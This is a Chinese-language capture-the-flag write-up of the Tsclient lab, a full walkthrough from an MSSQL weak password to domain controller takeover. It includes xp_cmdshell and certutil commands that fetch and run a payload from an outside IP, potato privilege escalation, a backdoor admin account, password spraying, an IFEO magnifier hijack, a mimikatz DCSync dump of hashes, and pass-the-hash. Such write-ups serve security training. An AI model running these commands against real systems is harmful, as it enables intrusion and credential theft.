+++
date = '2026-03-05T23:00:00+08:00'
lastmod = '2026-03-05T23:00:00+08:00'
draft = false
title = '春秋云境 - Tsclient WriteUP'
categories = ['WriteUP', '春秋云境']
tags = ['WriteUP', '春秋云境']

+++

## flag 1

访问题目连接是一个 IIS 服务器的页面。  

![](../assets/屏幕截图%202025-03-09%20183526.png)

用 fscan 扫描，发现存在 MSSQL 弱口令，我们尝试连接数据库。  

```plaintext
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-09 18:43:21] [INFO] 暴力破解线程数: 1
[2025-03-09 18:43:21] [INFO] 开始信息扫描
[2025-03-09 18:43:21] [INFO] 最终有效主机数量: 1
[2025-03-09 18:43:21] [INFO] 开始主机扫描
[2025-03-09 18:43:21] [INFO] 有效端口数量: 233
[2025-03-09 18:43:21] [SUCCESS] 端口开放 39.98.127.109:110
[2025-03-09 18:43:21] [SUCCESS] 端口开放 39.98.127.109:80
[2025-03-09 18:43:22] [SUCCESS] 端口开放 39.98.127.109:1433
[2025-03-09 18:43:24] [SUCCESS] 服务识别 39.98.127.109:110 =>
[2025-03-09 18:43:26] [SUCCESS] 服务识别 39.98.127.109:80 => [http]
[2025-03-09 18:43:27] [SUCCESS] 服务识别 39.98.127.109:1433 => [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.]
[2025-03-09 18:43:31] [INFO] 存活端口数量: 3
[2025-03-09 18:43:31] [INFO] 开始漏洞扫描
[2025-03-09 18:43:31] [INFO] 加载的插件: mssql, pop3, webpoc, webtitle
[2025-03-09 18:43:31] [SUCCESS] 网站标题 http://39.98.127.109      状态码:200 长度:703    标题:IIS Windows Server
[2025-03-09 18:43:40] [SUCCESS] MSSQL 39.98.127.109:1433 sa 1qaz!QAZ
```

我们连接到 MSSQL，发现连接到的 sa 用户具有较高的权限，我们考虑去利用 MSSQL 中的 xp_cmdshell 去执行系统命令，经过尝试发现条件满足可以执行系统命令。  
我们可以在 master.dbo.sysobjects 中查看 xp_cmdshell 状态。  

```SQL
select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

![](../assets/屏幕截图%202025-03-09%20190115.png)

只用判断存在，利用 `count(*)` 即可。  

```SQL
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

![](../assets/屏幕截图%202025-03-09%20190142.png)

下面我们可以利用 EXEC 启用 xp_cmdshell，再利用 xp_cmdshell 来执行命令。  

```SQL
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

exec master..xp_cmdshell 'whoami'
```

那么我们直接尝试给它上马。  

```SQL
exec master..xp_cmdshell 'certutil.exe -urlcache -split -f http://47.115.148.66:8084/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat'
```

成功 getshell，查看系统信息进行信息收集，根据系统版本寻找相应的提权方法。  

```plaintext
C:\Windows\system32>systeminfo

主机名:           WIN-WEB
OS 名称:          Microsoft Windows Server 2016 Datacenter
OS 版本:          10.0.14393 暂缺 Build 14393
OS 制造商:        Microsoft Corporation
OS 配置:          独立服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:
注册的组织:       Aliyun
产品 ID:          00376-40000-00000-AA947
初始安装日期:     2022/7/11, 12:46:14
系统启动时间:     2025/3/9, 18:28:29
系统制造商:       Alibaba Cloud
系统型号:         Alibaba Cloud ECS
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS 版本:        SeaBIOS 449e491, 2014/4/1
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     3,950 MB
可用的物理内存:   1,226 MB
虚拟内存: 最大值: 4,654 MB
虚拟内存: 可用:   535 MB
虚拟内存: 使用中: 4,119 MB
页面文件位置:     C:\pagefile.sys
域:               WORKGROUP
登录服务器:       暂缺
修补程序:         安装了 6 个修补程序。
                  [01]: KB5013625
                  [02]: KB4049065
                  [03]: KB4486129
                  [04]: KB4486131
                  [05]: KB5014026
                  [06]: KB5013952
网卡:             安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名:      以太网
                      启用 DHCP:   是
                      DHCP 服务器: 172.22.255.253
                      IP 地址
                        [01]: 172.22.8.18
                        [02]: fe80::205a:dd47:2165:6397
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
```

上传 Ladon 工具，使用 Ladon 工具提权，调用它的 BadPotato 模块直接提权上马。  

```bash
Ladon.exe BadPotato whoami
Ladon.exe BadPotato "certutil.exe -urlcache -split -f http://47.115.148.66:8084/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat"
```

我们成功在 `C:/Users/Administrator/flag` 获取到 flag 1。  

![](../assets/屏幕截图%202025-03-09%20195034.png)

```plaintext
 _________  ________  ________  ___       ___  _______   ________   _________   
|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\ 
\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_| 
     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \  
      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \ 
       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|
              \|_________|                                                      


Getting flag01 is easy, right?

flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4}


Maybe you should focus on user sessions...
```

## flag 2

搭建隧道代理为进一步渗透做准备，上传 fscan 进行扫描，进行进一步的信息收集。  

```plaintext
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-09 19:13:37] [INFO] 暴力破解线程数: 1
[2025-03-09 19:13:37] [INFO] 开始信息扫描
[2025-03-09 19:13:37] [INFO] CIDR范围: 172.22.8.0-172.22.8.255
[2025-03-09 19:13:37] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING)
[2025-03-09 19:13:37] [INFO] 解析CIDR 172.22.8.18/24 -> IP范围 172.22.8.0-172.22.8.255
[2025-03-09 19:13:37] [INFO] 最终有效主机数量: 256
[2025-03-09 19:13:37] [INFO] 开始主机扫描
[2025-03-09 19:13:37] [INFO] 正在尝试无监听ICMP探测...
[2025-03-09 19:13:37] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-03-09 19:13:37] [INFO] 切换为PING方式探测...
[2025-03-09 19:13:37] [SUCCESS] 目标 172.22.8.31     存活 (ICMP)
[2025-03-09 19:13:37] [SUCCESS] 目标 172.22.8.46     存活 (ICMP)
[2025-03-09 19:13:37] [SUCCESS] 目标 172.22.8.18     存活 (ICMP)
[2025-03-09 19:13:38] [SUCCESS] 目标 172.22.8.15     存活 (ICMP)
[2025-03-09 19:13:40] [INFO] 存活主机数量: 4
[2025-03-09 19:13:40] [INFO] 有效端口数量: 233
[2025-03-09 19:13:40] [SUCCESS] 端口开放 172.22.8.15:88
[2025-03-09 19:13:40] [SUCCESS] 端口开放 172.22.8.46:80
[2025-03-09 19:13:40] [SUCCESS] 端口开放 172.22.8.18:80
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.15:445
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.46:445
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.31:139
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.31:445
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.18:445
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.15:389
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.15:139
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.46:139
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.18:135
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.18:139
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.15:135
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.46:135
[2025-03-09 19:13:41] [SUCCESS] 端口开放 172.22.8.31:135
[2025-03-09 19:13:43] [SUCCESS] 端口开放 172.22.8.18:1433
[2025-03-09 19:13:45] [SUCCESS] 服务识别 172.22.8.15:88 => 
[2025-03-09 19:13:45] [SUCCESS] 服务识别 172.22.8.18:80 => [http]
[2025-03-09 19:13:45] [SUCCESS] 服务识别 172.22.8.46:80 => [http]
[2025-03-09 19:13:46] [SUCCESS] 服务识别 172.22.8.15:445 => 
[2025-03-09 19:13:46] [SUCCESS] 服务识别 172.22.8.46:445 => 
[2025-03-09 19:13:46] [SUCCESS] 服务识别 172.22.8.31:139 =>  Banner:[.]
[2025-03-09 19:13:46] [SUCCESS] 服务识别 172.22.8.31:445 => 
[2025-03-09 19:13:46] [SUCCESS] 服务识别 172.22.8.18:445 => 
[2025-03-09 19:13:46] [SUCCESS] 服务识别 172.22.8.15:139 =>  Banner:[.]
[2025-03-09 19:13:46] [SUCCESS] 服务识别 172.22.8.46:139 =>  Banner:[.]
[2025-03-09 19:13:47] [SUCCESS] 服务识别 172.22.8.18:139 =>  Banner:[.]
[2025-03-09 19:13:48] [SUCCESS] 服务识别 172.22.8.18:1433 => [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.]
[2025-03-09 19:13:51] [SUCCESS] 服务识别 172.22.8.15:389 => 
[2025-03-09 19:14:47] [SUCCESS] 服务识别 172.22.8.18:135 => 
[2025-03-09 19:14:47] [SUCCESS] 服务识别 172.22.8.15:135 => 
[2025-03-09 19:14:47] [SUCCESS] 服务识别 172.22.8.46:135 => 
[2025-03-09 19:14:47] [SUCCESS] 服务识别 172.22.8.31:135 => 
[2025-03-09 19:14:47] [INFO] 存活端口数量: 17
[2025-03-09 19:14:47] [INFO] 开始漏洞扫描
[2025-03-09 19:14:47] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle
[2025-03-09 19:14:47] [SUCCESS] 网站标题 http://172.22.8.46        状态码:200 长度:703    标题:IIS Windows Server
[2025-03-09 19:14:47] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.8.46
主机名: WIN2016
发现的网络接口:
   IPv4地址:
      └─ 172.22.8.46
[2025-03-09 19:14:47] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.8.31
主机名: WIN19-CLIENT
发现的网络接口:
   IPv4地址:
      └─ 172.22.8.31
[2025-03-09 19:14:47] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.8.18
主机名: WIN-WEB
发现的网络接口:
   IPv4地址:
      └─ 172.22.8.18
   IPv6地址:
      └─ 2001:0:348b:fb58:1445:3719:d89d:8092
[2025-03-09 19:14:47] [SUCCESS] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         
[2025-03-09 19:14:47] [SUCCESS] NetBios 172.22.8.15     DC:XIAORANG\DC01           
[2025-03-09 19:14:47] [SUCCESS] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[2025-03-09 19:14:47] [SUCCESS] 网站标题 http://172.22.8.18        状态码:200 长度:703    标题:IIS Windows Server
[2025-03-09 19:14:47] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.8.15
主机名: DC01
发现的网络接口:
   IPv4地址:
      └─ 172.22.8.15
[2025-03-09 19:14:48] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ
[2025-03-09 19:15:11] [SUCCESS] 扫描已完成: 32/32
```

发现有一台域控和两台域内机器，下面我们进一步扫描 `172.22.8.46`，并没有发现什么特别的东西，那么我们用命令查询用户会话的相关信息以及查看网络连接信息。（加了个用户可以 rdp 连接上去方便操作）  

```bash
net user lucifer qwer1234! /add
net localgroup administrators lucifer /add
runas /user:lucifer cmd

net user  		   #查看当前机器用户  
quser || qwinst    #查看在线用户
```

![](../assets/屏幕截图%202025-03-09%20204444.png)

发现有用户通过 rdp 连接到 `172.22.8.18` 上，我们可以使用 rdp 反向攻击，利用工具 SharpToken 去执行命令，发现这东西有点问题不能弹出持久化的终端，那么我们选择给 john 用户再上一个马（需要先 RDP 过去安装一下 `.NET` 环境才能运行工具） 。  

```bash
SharpToken.exe execute "WIN-WEB\John" "cmd /c certutil.exe -urlcache -split -f http://47.115.148.66:8084/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat"
```

我们查看它的网络连接状况，发现有挂载着一个目录，访问目录中的内容发现有提示文件。  

![](../assets/屏幕截图%202025-03-09%20221652.png)

```bash
net use

dir \\TSCLIENT\C
type \\TSCLIENT\C\credential.txt
```

![](../assets/屏幕截图%202025-03-09%20222051.png)

```plaintext
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

那么我们去进行账号密码喷射攻击，发现有几台机子存在这个账户密码。  

```bash
proxychains crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#' -d xiaorang.lab 2>/dev/null
```

我们尝试登录，发现要修改账号密码，修改完之后发现还是登录不了，反而能够登录 `172.22.8.46`。  

```bash
proxychains rdesktop 172.22.8.31:3389 -u 'Aldrich' -d xiaorang.lab -p 'Ald@rLMWuy7Z!#'
proxychains rdesktop 172.22.8.46:3389 -u 'Aldrich' -d xiaorang.lab -p 'Abc123456'
```

这个 rdesktop 还是不太好用，我们选择用回 RDP 去直接连接。  

```plaintext
账号：xiaorang.lab\Aldrich
密码：Abc123456
```

这里连上去发现不出网，那么我们打算用 windows 的网络服务——共享文件夹来传输文件，首先在我们的 `WIN-WEB\lucifer` 将想要传输的文件放入特定的文件夹，我这里是 `C:\Tmp`；再右键“属性”-“共享”-“添加共享给 Everyone”，就可以将这个文件夹的共享给 `xiaorang.lab\Aldrich`，从而进行进一步的操作。  

然后再 WIN+R 输入 `\\172.22.8.18` 登录 `lucifer` 账户即可。  

![](../assets/屏幕截图%202025-03-10%20225639.png)

然后用 SharpToken 来给整个域进行扫描，进行信息收集，将生成的压缩包丢到 BloodHound 中就能看到整个域的拓扑结构了。  

```bash
SharpHound.exe -c All
```

下面是启动 BloodHound 的一些命令。  

```bash
neo4j start
bloodhound
```

然后我们根据收集到的信息，考虑接下来要进行提权。  

![](../assets/bowuchulingPic1.png)

然后根据之前的共享文件夹中的提示 `Do you know how to hijack Image?`，我们可以知道是打 `IFEO` 映像劫持利用，也被称为重定向劫持，具体方法是通过修改注册表更改一些系统辅助功能绑定的应用程序，从而提权。  

```bash
get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

![](../assets/屏幕截图%202025-03-11%20223516.png)

我们发现 NT AUTHORITY\Authenticated Users 可以修改注册表，那么就劫持放大镜提权。  

```bash
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

将屏幕锁定，然后打开放大镜就是 system 权限终端了成功提权。  

![](../assets/屏幕截图%202025-03-10%20234843.png)

然后可以拿到 `flag02.txt`，再进行下一步操作。  

```plaintext
# type c:\Users\Administrator\flag\flag02.txt

   . .    .       . .       . .       .      .       . .       . .       . .    .    
.+'|=|`+.=|`+. .+'|=|`+. .+'|=|`+. .+'|      |`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=|`+. 
|.+' |  | `+.| |  | `+.| |  | `+.| |  |      |  | |  | `+.| |  | `+ | |.+' |  | `+.| 
     |  |      |  | .    |  |      |  |      |  | |  |=|`.  |  |  | |      |  |      
     |  |      `+.|=|`+. |  |      |  |      |  | |  | `.|  |  |  | |      |  |      
     |  |      .    |  | |  |    . |  |    . |  | |  |    . |  |  | |      |  |      
     |  |      |`+. |  | |  | .+'| |  | .+'| |  | |  | .+'| |  |  | |      |  |      
     |.+'      `+.|=|.+' `+.|=|.+' `+.|=|.+' |.+' `+.|=|.+' `+.|  |.|      |.+'      




flag02: flag{d6920c85-aff3-427e-8916-36f7bdced41e}
```

## flag 3

之后就是正常的域内打法了，先用 mimikatz 在提过权的终端将域内用户的哈希导出来。  

```bash
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit > all.csv
```

导出的信息如下。  

```plaintext
mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
502	krbtgt	3ffd5b58b4a6328659a606c3ea6f9b63	514
1000	DC01$	71a62a8d90bda149c898604fb7a4038f	532480
500	Administrator	2c9d81bdcf3ec8b1def10328a7cc2f08	512
1103	WIN2016$	6ed76f215b213df531cff8af13338b1f	16781312
1104	WIN19-CLIENT$	a0328dd05d7100d0ef4c9c92c90536ca	16781312
1105	Aldrich	0607f770c2f37e09a850e09e920a9f45	512
```

再查看一下域内的域管理员有哪些用户。  

```bash
net group "domain admins" /domain
```

我们发现除了 `Administrator`，还有一个 `WIN2016$`，即机器账户可以 Hash 传递登录域控，所以我们直接横向移动到域控了。  

```bash
proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk
```

最终拿到 flag 3。  

```bash
type c:\users\administrator\flag\flag03.txt
```

最终的 flag 如下。  

```plaintext
C:\Windows\system32>type c:\users\administrator\flag\flag03.txt
 _________               __    _                  _
|  _   _  |             [  |  (_)                / |_
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-'
    | |   ( (`\] / /'`\] | | [  |/ /__\\[ `.-. | | |
   _| |_   `'.'. | \__.  | |  | || \__., | | | | | |,
  |_____| [\__) )'.___.'[___][___]'.__.'[___||__]\__/


Congratulations! ! !

flag03: flag{4f1a5ff7-cce9-4f0f-a5e5-f02ed977d513}
```

